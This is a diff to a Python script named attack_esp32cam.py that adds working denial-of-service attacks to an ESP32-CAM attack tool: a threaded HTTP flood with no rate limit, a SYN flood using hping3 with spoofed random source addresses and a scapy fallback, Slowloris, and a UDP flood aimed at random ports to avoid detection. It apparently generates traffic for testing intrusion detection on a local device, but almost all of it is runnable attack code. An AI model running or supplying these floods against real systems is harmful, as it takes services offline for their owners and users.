@@ -328,6 +328,210 @@ class ESP32CamAttacker:
         self.log_attack("Connection Flood", "COMPLETED", f"Success: {success}, Failed: {failed}")
 
     # =========================================================================
+    # DDoS / DoS Attacks
+    # =========================================================================
+
+    def attack_http_flood(self, duration: int = 30, threads: int = 10):
+        """HTTP Flood DDoS - Multiple threads sending rapid HTTP requests."""
+        print(f"\n{Colors.HEADER}{'='*76}")
+        print(f"ATTACK 7: HTTP Flood DDoS ({threads} threads for {duration}s)")
+        print(f"{'='*76}{Colors.ENDC}\n")
+
+        self.log_attack("HTTP Flood DDoS", "STARTING", f"{threads} threads attacking for {duration}s")
+
+        request_counts = [0] * threads
+        stop_flag = threading.Event()
+
+        def flood_worker(worker_id):
+            """Worker thread for HTTP flooding."""
+            count = 0
+            while not stop_flag.is_set():
+                try:
+                    response = requests.get(
+                        f"http://{self.target_ip}/",
+                        timeout=0.5,  # Much shorter timeout
+                        headers={'User-Agent': f'DDoSBot-{worker_id}'}
+                    )
+                    count += 1
+                    request_counts[worker_id] = count
+                except:
+                    # Don't block on errors
+                    count += 1
+                    request_counts[worker_id] = count
+                # No sleep - send as fast as possible!
+
+        # Start worker threads
+        workers = []
+        for i in range(threads):
+            t = threading.Thread(target=flood_worker, args=(i,))
+            t.daemon = True
+            t.start()
+            workers.append(t)
+
+        # Monitor progress
+        start_time = time.time()
+        while time.time() - start_time < duration:
+            total_requests = sum(request_counts)
+            elapsed = int(time.time() - start_time)
+            print(f"  [{elapsed}/{duration}s] Total HTTP requests sent: {total_requests}", end='\r')
+            time.sleep(1)
+
+        # Stop workers
+        stop_flag.set()
+        time.sleep(0.5)
+
+        total_requests = sum(request_counts)
+        rps = total_requests / duration
+        self.log_attack("HTTP Flood DDoS", "COMPLETED", f"{total_requests} requests ({rps:.1f} req/s)")
+
+    def attack_syn_flood(self, count: int = 500):
+        """SYN Flood DoS - Half-open TCP connections (requires root)."""
+        print(f"\n{Colors.HEADER}{'='*76}")
+        print(f"ATTACK 8: SYN Flood DoS ({count} SYN packets)")
+        print(f"{'='*76}{Colors.ENDC}\n")
+
+        # Check if running as root
+        if os.geteuid() != 0:
+            self.log_attack("SYN Flood DoS", "SKIPPED", "Requires root privileges")
+            return
+
+        self.log_attack("SYN Flood DoS", "STARTING", f"Sending {count} SYN packets")
+
+        try:
+            # Use hping3 for SYN flood
+            cmd = [
+                "hping3",
+                "-S",  # SYN flag
+                "-p", "80",  # Target port
+                "-c", str(count),  # Count
+                "--flood",  # Flood mode
+                "--rand-source",  # Random source IPs
+                self.target_ip
+            ]
+
+            result = subprocess.run(
+                cmd,
+                capture_output=True,
+                timeout=30
+            )
+
+            if result.returncode == 0:
+                self.log_attack("SYN Flood DoS", "SUCCESS", f"Sent {count} SYN packets")
+            else:
+                self.log_attack("SYN Flood DoS", "FAILED", "hping3 error")
+
+        except FileNotFoundError:
+            # Fallback to scapy if hping3 not available
+            try:
+                from scapy.all import IP, TCP, send
+
+                print("  Using scapy for SYN flood...")
+                sent = 0
+                for i in range(count):
+                    # Create SYN packet with random source port
+                    pkt = IP(dst=self.target_ip)/TCP(dport=80, flags='S', sport=1024+i)
+                    send(pkt, verbose=0)
+                    sent += 1
+
+                    if i % 100 == 0:
+                        print(f"  [{i}/{count}] SYN packets sent...", end='\r')
+
+                self.log_attack("SYN Flood DoS", "SUCCESS", f"Sent {sent} SYN packets via scapy")
+
+            except ImportError:
+                self.log_attack("SYN Flood DoS", "SKIPPED", "hping3 and scapy not available")
+        except Exception as e:
+            self.log_attack("SYN Flood DoS", "FAILED", str(e))
+
+    def attack_slowloris(self, duration: int = 60, connections: int = 200):
+        """Slowloris DoS - Slow HTTP requests to exhaust connections."""
+        print(f"\n{Colors.HEADER}{'='*76}")
+        print(f"ATTACK 9: Slowloris DoS ({connections} slow connections)")
+        print(f"{'='*76}{Colors.ENDC}\n")
+
+        self.log_attack("Slowloris DoS", "STARTING", f"{connections} slow HTTP connections for {duration}s")
+
+        sockets = []
+
+        # Create slow connections
+        for i in range(connections):
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(4)
+                sock.connect((self.target_ip, 80))
+
+                # Send incomplete HTTP request
+                sock.send(b"GET / HTTP/1.1\r\n")
+                sock.send(f"Host: {self.target_ip}\r\n".encode())
+                sock.send(b"User-Agent: Mozilla/5.0\r\n")
+                # Don't send final \r\n to keep connection open
+
+                sockets.append(sock)
+
+                if i % 50 == 0:
+                    print(f"  [{i}/{connections}] Connections established...", end='\r')
+
+            except Exception as e:
+                pass
+
+        print(f"\n  Established {len(sockets)} slow connections")
+
+        # Keep connections alive by sending partial headers
+        start_time = time.time()
+        while time.time() - start_time < duration:
+            for sock in sockets[:]:
+                try:
+                    # Send random header to keep alive
+                    sock.send(f"X-Keep-Alive: {int(time.time())}\r\n".encode())
+                except:
+                    sockets.remove(sock)
+
+            elapsed = int(time.time() - start_time)
+            print(f"  [{elapsed}/{duration}s] Active connections: {len(sockets)}", end='\r')
+            time.sleep(10)
+
+        # Close all sockets
+        for sock in sockets:
+            try:
+                sock.close()
+            except:
+                pass
+
+        self.log_attack("Slowloris DoS", "COMPLETED", f"Maintained {len(sockets)} slow connections")
+
+    def attack_udp_flood(self, count: int = 1000, packet_size: int = 1024):
+        """UDP Flood - Overwhelming with UDP packets."""
+        print(f"\n{Colors.HEADER}{'='*76}")
+        print(f"ATTACK 10: UDP Flood ({count} packets, {packet_size} bytes each)")
+        print(f"{'='*76}{Colors.ENDC}\n")
+
+        self.log_attack("UDP Flood", "STARTING", f"Sending {count} UDP packets")
+
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        payload = b'X' * packet_size
+
+        sent = 0
+        failed = 0
+
+        for i in range(count):
+            try:
+                # Send to random ports to avoid detection
+                target_port = 1024 + (i % 64511)
+                sock.sendto(payload, (self.target_ip, target_port))
+                sent += 1
+
+                if i % 200 == 0:
+                    print(f"  [{i}/{count}] UDP packets sent...", end='\r')
+
+            except Exception as e:
+                failed += 1
+
+            time.sleep(0.001)  # Very fast
+
+        sock.close()
+        self.log_attack("UDP Flood", "COMPLETED", f"Sent: {sent}, Failed: {failed}")
+
+    # =========================================================================
     # Monitoring Thread
     # =========================================================================
     def monitor_device_status(self, duration: int = 300):
@@ -367,7 +571,8 @@ class ESP32CamAttacker:
         """Execute attack sequence."""
 
         if attacks is None:
-            attacks = ["tcp_scan", "http_flood", "banner_grab", "connection_flood"]
+            # Default attack sequence includes DDoS
+            attacks = ["tcp_scan", "http_flood", "ddos_http", "slowloris"]
 
         print(f"{Colors.OKBLUE}Initial device check...{Colors.ENDC}")
         initial_status = self.check_device_status()
@@ -390,14 +595,23 @@ class ESP32CamAttacker:
         )
         monitor_thread.start()
 
-        # Execute attacks
+        # Execute attacks - Map attack names to methods
         attack_map = {
+            # Port Scanning Attacks
             "tcp_scan": self.attack_tcp_connect_scan,
             "syn_scan": self.attack_syn_scan,
             "service_detect": self.attack_service_detection,
+
+            # HTTP Attacks
             "http_flood": self.attack_repeated_http_access,
             "banner_grab": self.attack_banner_grab,
-            "connection_flood": self.attack_connection_flood
+            "connection_flood": self.attack_connection_flood,
+
+            # DDoS / DoS Attacks
+            "ddos_http": lambda: self.attack_http_flood(duration=30, threads=10),
+            "ddos_syn": lambda: self.attack_syn_flood(count=500),
+            "slowloris": lambda: self.attack_slowloris(duration=60, connections=200),
+            "udp_flood": lambda: self.attack_udp_flood(count=1000, packet_size=1024)
         }
 
         for attack_name in attacks:
@@ -457,22 +671,36 @@ def main():
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
-  # Run all attacks
-  sudo python3 attack_esp32cam.py
+  # Run default attack sequence (includes DDoS)
+  python3 attack_esp32cam.py
 
-  # Run specific attacks
-  python3 attack_esp32cam.py --attacks tcp_scan,http_flood
+  # Run DDoS attacks only
+  python3 attack_esp32cam.py --attacks ddos_http,slowloris
+
+  # Run all attacks with root privileges
+  sudo python3 attack_esp32cam.py --attacks tcp_scan,syn_scan,ddos_syn,udp_flood
 
   # Custom target
   python3 attack_esp32cam.py --target 10.42.0.136
 
 Available Attacks:
-  tcp_scan          - Basic TCP connect scan (noisy, easily detected)
-  syn_scan          - SYN stealth scan (requires root)
-  service_detect    - Aggressive service/OS detection
-  http_flood        - Repeated unauthorized HTTP access
-  banner_grab       - Banner grabbing on multiple ports
-  connection_flood  - Rapid connection flooding
+  PORT SCANNING:
+    tcp_scan          - Basic TCP connect scan (noisy, easily detected)
+    syn_scan          - SYN stealth scan (requires root)
+    service_detect    - Aggressive service/OS detection
+    banner_grab       - Banner grabbing on multiple ports
+
+  HTTP ATTACKS:
+    http_flood        - Repeated unauthorized HTTP access (50+ requests)
+    connection_flood  - Rapid connection flooding (100 connections)
+
+  DDoS / DoS ATTACKS:
+    ddos_http         - HTTP Flood DDoS (10 threads for 30s) 🔥
+    ddos_syn          - SYN Flood DoS (500 packets, requires root)
+    slowloris         - Slowloris DoS (200 slow connections for 60s) 🔥
+    udp_flood         - UDP Flood (1000 packets)
+
+  🔥 = High chance of triggering IDS DDoS detection
         """
     )
 
